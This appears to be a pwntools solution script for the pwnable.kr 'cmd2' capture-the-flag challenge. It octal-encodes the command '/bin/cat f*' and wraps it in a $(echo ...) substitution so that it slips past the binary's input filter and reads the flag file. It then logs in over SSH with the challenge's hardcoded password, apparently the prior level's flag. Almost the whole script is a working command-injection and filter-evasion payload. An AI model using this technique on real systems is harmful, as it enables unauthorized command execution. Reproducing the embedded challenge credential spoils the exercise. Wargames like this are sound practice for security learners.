#coding=utf-8
from pwn import *

target = '/bin/cat f*'
payload = ''
for t in target:
  payload += '\\' + oct(ord(t))
#print payload
argv = ['./cmd2', '$(echo \"' + payload + '\")']

debug = 0
if debug:
  p = process(argv = argv)
else:
  s = ssh(host = 'pwnable.kr', port = 2222, user = 'cmd2', password = 'mommy now I get what PATH environment is for :)')
  s.set_working_directory('/home/cmd2')
  p = s.process(argv = argv)
print p.recvall(1)
